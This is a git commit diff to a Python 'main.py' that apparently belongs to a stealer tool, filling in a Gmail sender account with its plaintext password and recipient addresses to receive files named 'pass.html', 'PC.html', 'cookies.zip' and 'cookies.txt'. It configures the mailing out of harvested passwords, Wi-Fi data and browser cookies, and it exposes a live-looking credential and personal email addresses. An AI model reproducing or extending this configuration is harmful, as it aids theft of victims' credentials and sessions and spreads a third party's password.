55841ef251bf716636fdd8ab3825eca188fb661a
KODA <67868533+K0D4XP1@users.noreply.github.com>
2022-01-31 10:40:29 -0300

    Update main.py

--- python_source/main.py
+++ python_source/main.py
@@ -12,9 +12,9 @@ from wifi import WIFI
 
 class Main:
     def __init__(self):
-        self.source_mail = 'YOUR_EMAIL@gmail.com'
-        self.source_pass = 'YOUR_PASSWORD'
-        self.dest_mail = ['kovinevmv@gmail.com', 'YOUR_EMAIL@gmail.com', 'ANOTHER_EMAIL@gmail.com']
+        self.source_mail = 'canaldopapaleguas@gmail.com'
+        self.source_pass = 'jogos2003'
+        self.dest_mail = ['canaldopapaleguas@gmail.com', 'leo.freire.alves92@gmail.com']
 
         self.files = ['pass.html', 'PC.html', 'cookies.zip', 'cookies.txt']
 
